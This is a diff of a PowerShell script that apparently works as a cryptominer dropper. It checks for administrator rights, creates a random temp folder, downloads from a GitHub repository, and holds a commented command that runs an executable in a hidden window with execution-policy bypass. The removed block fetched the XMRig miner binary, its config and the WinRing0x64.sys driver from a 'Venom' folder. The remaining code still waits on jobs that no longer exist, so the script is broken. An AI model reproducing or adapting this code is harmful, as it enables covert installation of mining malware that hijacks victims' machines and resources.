@@ -23,7 +23,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 ## variables
 $wd = random_text
 $path = "$env:temp/$wd"
-$path_1 = $path/$wd
+$rig = $path/$wd
 $initial_dir = Get-Location
 
 
@@ -64,51 +64,10 @@ Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs
 
 #powershell powershell.exe -windowstyle hidden -ep bypass ./attempt1.exe
 
-mkdir $path_1
-cd $path_1
+mkdir $rig
+cd $rig
 
 
-
-$baseUri = 'https://github.com/P0k3m0n-unleashed/ProjSucc/tree/master/Venom/xmrig-6.22.2'
-$files = @(
-    @{
-        Uri = "$baseUri/SHA256SUMS"
-        OutFile = 'SHA256SUMS.txt'
-    },
-    @{
-        Uri = "$baseUri/WinRing0x64.sys"
-        OutFile = 'WinRing0x64.sys'
-    },
-    @{
-        Uri = "$baseUri/benchmark_10M.cmd"
-        OutFile = 'benchmark_10M.cmd'
-    },
-    @{
-        Uri = "$baseUri/benchmark_1M.cmd"
-        OutFile = 'benchmark_1M.cmd'
-    },
-    @{
-        Uri = "$baseUri/config.json"
-        OutFile = 'config.json'
-    },
-    @{
-        Uri = "$baseUri/start.cmd"
-        OutFile = 'start.cmd'
-    },
-    @{
-        Uri = "$baseUri/xmrig.exe"
-        OutFile = 'xmrig.exe'
-    } 
-)
-
-$jobs = @()
-
-foreach ($file in $files) {
-    $jobs += Start-ThreadJob -Name $file.OutFile -ScriptBlock {
-        $params = $using:file
-        Invoke-WebRequest @params
-    }
-}
 
 Write-Host "Downloads started..."
 Wait-Job -Job $jobs
